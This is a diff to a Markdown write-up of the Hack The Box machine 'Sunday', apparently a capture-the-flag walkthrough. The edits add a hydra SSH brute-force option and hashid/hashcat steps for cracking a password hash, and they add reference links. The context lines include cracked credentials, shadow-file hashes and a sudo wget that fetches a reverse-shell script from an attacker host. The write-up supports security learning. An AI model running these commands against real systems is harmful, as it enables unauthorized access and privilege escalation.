@@ -70,7 +70,7 @@ cat /usr/share/seclists/Usernames/Names/names.txt | ForEach-Object -Parallel { $
 + SSH is open, and there are 2 valid usernames: sammy adn sunny
 + Brute force the users' credentials using hydra.
 ```
-hydra -L users.txt -P /usr/share/seclists/Passwords/probable-v2-top1575.txt 10.10.10.76 ssh -s 22022 -f
+hydra -L users.txt -P /usr/share/seclists/Passwords/probable-v2-top1575.txt 10.10.10.76 ssh -s 22022 -f -t 64
 ```
 
 + `sunny`:`sunday` username and password found.
@@ -116,9 +116,15 @@ sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/66bdf411-8ca1-4b95-859e-3dac32645544)
 
+
 + **Using hashcat:**
 + Now, copy **sammy**'s password hash, and save in the **hash** file.
-+ Specify the hash type from checking [hashcat.net](https://hashcat.net/wiki/doku.php?id=example_hashes).
++ Determine which type of hash algorithm: `hashid hash`
++ `hashcat -h | grep SHA256`
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/66330abf-4cc2-41bc-8f40-1cb29e9f3caf)
+
++ **Alternatively**, specify the hash type from checking [hashcat.net](https://hashcat.net/wiki/doku.php?id=example_hashes).
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/f0658f0b-36d3-4081-9d7a-4c93ece481f0)
 
@@ -206,7 +212,10 @@ sudo wget http://10.10.14.8:8000/rev_shell.py -O /root/troll
 + https://0xdf.gitlab.io/2018/09/29/htb-sunday.html
 + https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/linux-boxes/sunday-writeup-w-o-metasploit
 + https://benheater.com/hackthebox-sunday/
-+ x
++ https://medium.com/@Inching-Towards-Intelligence/htb-sunday-62-100-faf28831de11
++ https://manuelvazquez-contact.gitbook.io/oscp-prep/hack-the-box/sunday
++ https://medium.com/@joemcfarland/hack-the-box-sunday-writeup-c2dcee3593d8
++ https://medium.com/ctf-writeups/sunday-write-up-htb-c5993ba78c9
 
 # More:
 + **Pentesting Finger:** https://book.hacktricks.xyz/network-services-pentesting/pentesting-finger
